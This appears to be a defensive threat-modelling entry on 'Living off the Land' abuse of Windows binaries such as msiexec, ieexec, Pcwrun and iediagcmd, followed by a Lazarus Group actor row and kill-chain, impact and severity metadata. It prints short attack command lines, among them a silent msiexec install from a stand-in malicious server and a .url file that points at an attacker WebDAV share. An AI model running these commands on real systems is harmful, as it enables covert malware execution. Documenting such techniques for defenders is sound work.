## üëÅÔ∏è Description

> Threat actors frequently exploit legitimate Windows utilities to execute malicious 
> code covertly, a technique known as "Living off the Land" (LotL). 
> By using trusted system binaries, attackers can bypass security measures that focus 
> on untrusted or unusual processes, thereby reducing the likelihood of detection.
> 
> ### 1. Ieexec.exe
> 
> **Description**: A utility that executes .NET programs. Threat actors can use ieexec.exe 
> to run malicious executables under the guise of Internet Explorer components.
> 
> Example:
> 
> ```
> ieexec.exe C:\path\to\malicious.exe
> ```
> 
> ### 2. Ie4uinit.exe
> 
> **Description**: Initializes user-specific settings for Internet Explorer. 
> Can be misused to execute INF files.
> 
> Example:
> 
> ```
> ie4uinit.exe -UserIconConfig
> ```
> 
> ### 3. Msiexec.exe
> 
> **Description**: Used for installing, modifying, and performing operations 
> on Windows Installer packages. Threat actors can execute malicious MSI packages or scripts.
> 
> Example:
> 
> ```
> msiexec.exe /q /i http://malicious-server/payload.msi
> ```
> 
> ### 4. Pcwrun.exe
> 
> **Description**: Part of the Performance Counters for Windows. 
> It can be exploited to run scripts or executables under certain conditions.
> 
> Example:
> 
> ```
> Pcwrun.exe /../../$(calc).exe
> ```
> 
> ### 5. DevToolsLauncher.exe
> 
> **Description**: Associated with Visual Studio development tools. 
> It can be abused to execute code or scripts in the context of development environments.
> 
> Example:
> 
> > Execute any binary with given arguments and it will call developertoolssvc.exe. 
> developertoolssvc is actually executing the binary.
> 
> ```
> devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] "argument here" test
> ```
> 
> ### 6. Iediagcmd.exe
> 
> **Description**: Diagnostics Utility for Internet Explorer
> It can be used to execute binary pre-planted.
> 
> Example:
> 
> A .url file is sent to the victim or planted on disk.
> It sets the WorkingDirectory to \\attacker.webdav.server\share
> iediagcmd.exe tries to launch other tools like route.exe, 
> netsh.exe, or CustomShellHost.exe.
> 
> ```
> [InternetShortcut]
> URL=C:\\Program Files\\Internet Explorer\\iediagcmd.exe
> WorkingDirectory=\\\\192.168.8.200@80\\payload
> IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
> IconIndex=13
> ShowCommand=7
> ```

| Lazarus Group      | Since 2009, HIDDEN COBRA actors have leveraged their capabilities to target and compromise a range of victims; some intrusions have resulted in the exfiltration of data while others have been disruptive in nature. Commercial reporting has referred to this activity as Lazarus Group and Guardians of Peace. Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware. Variants of malware and tools used by HIDDEN COBRA actors include Destover, Duuzer, and Hangman.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Operation DarkSeoul, Dark Seoul, Hidden Cobra, Hastati Group, Andariel, Unit 121, Bureau 121, NewRomanic Cyber Army Team, Bluenoroff, Subgroup: Bluenoroff, Group 77, Labyrinth Chollima, Operation Troy, Operation GhostSecret, Operation AppleJeus, APT38, APT 38, Stardust Chollima, Whois Hacking Team, Zinc, Appleworm, Nickel Academy, APT-C-26, NICKEL GLADSTONE, COVELLITE, ATK3, G0032, ATK117, G0082, Citrine Sleet, DEV-0139, DEV-1222, Diamond Sleet, ZINC, Sapphire Sleet, COPERNICIUM, TA404, Lazarus group, BeagleBoyz, Moonstone Sleet | üåå MISP Threat Actor Galaxy | No documented sighting | No documented references |

## Model Data

#### **‚õìÔ∏è Cyber Kill Chain**

 > Cyber attacks are typically phased progressions towards strategic objectives. The Unified Kill Chains provides insight into the tactics that hackers employ to attain these objectives. This provides a solid basis to develop (or realign) defensive strategies to raise cyber resilience.

 [`‚ö° Execution`](https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf) : Techniques that result in execution of attacker-controlled code on a local or remote system.

---

#### **üõ∞Ô∏è Domains**

 > Infrastructure technologies domain of interest to attackers.

 `üè¢ Enterprise` : Generic databases, applications, machines and systems that are usually on premises or on Cloud traditional VMs.

---

#### **üéØ Targets**

 > Granular delimited technical entities holding a value to the organization, that are targeted by adversaries. They might be also involved in the detection coverage as the target of log collection. Partially inspired by Veris.

  - [`üñ•Ô∏è Workstations`](http://veriscommunity.net/enums.html#section-asset) : Placeholder
 - [`üíª Laptop`](http://veriscommunity.net/enums.html#section-asset) : User Device - Laptop
 - [`üõ†Ô∏è Virtual Machines`](http://veriscommunity.net/enums.html#section-asset) : Placeholder
 - [`üñ•Ô∏è Public-Facing Servers`](http://veriscommunity.net/enums.html#section-asset) : Placeholder

---

#### **üíø Platforms concerned**

 > Actual technologies used by the organization that will be exploited by adversaries during a successful attack, and eventually of relevance for detection. Are named by commercial designation.

 ` Windows` : Placeholder

---

#### **üí£ Severity**

 > The severity summarizes the overall danger of incident the vector will provoke, and is to be derived (WIP) from impact, leverage, and difficulty to execute.

 [`‚ö†Ô∏è Significant incident`](https://www.ncsc.gov.uk/news/new-cyber-attack-categorisation-system-improve-uk-response-incidents) : A cyber attack which has a serious impact on a large organisation or on wider / local government, or which poses a considerable risk to central government or (inter)national essential services.

---

#### **ü™Ñ Leverage acquisition**

 > Technical aftermath of the attack from the target perspective, differentiated from impact as it does not consider the value of the consequence, only what increased control the vector execution provides to the adversary.

  - [`üíÖ Elevation of privilege`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Capacity to augment leverage over the target system by upgrading the compromised access rights
 - [`üêí Tampering`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action intending to maliciously change or modify persistent data, such as records in a database, and the alteration of data in transit between two computers over an open network, such as the Internet.
 - [`üëÅÔ∏è‚Äçüó®Ô∏è Information Disclosure`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action intending to read a file that one was not granted access to, or to read data in transit.

---

#### **üí• Impact**

 > Analysis of the threat vector from the organizational perspective, in non technical term. This aims at putting a clear denomination on what the attacker will actually be able to act upon if the threat vector is realized.

  - [`üîì Data Breach`](http://veriscommunity.net/enums.html#section-impact) : Non-public information has been accessed from the outside, and successfully extracted.
 - [`üõë Business disruption`](http://veriscommunity.net/enums.html#section-impact) : Business disruption
 - [`üåç Reputational Damages`](http://veriscommunity.net/enums.html#section-impact) : Damages to the organization public view may be achieved by using directly the access gained, or indirectly with data gathered.

---

#### **üé≤ Vector Viability**

 > Described with estimative language (likelyhood probability), describes how likely the analyst believes the vector to actually be realized on the organization infrastructure. Estimative language describes quality and credibility of underlying sources, data, and methodologies based Intelligence Community Directive 203 (ICD 203) and JP 2-0, Joint Intelligence.

 [`üßê Likely`](https://www.dni.gov/files/documents/ICD/ICD%20203%20Analytic%20Standards.pdf) : Probable (probably) - 55-80%
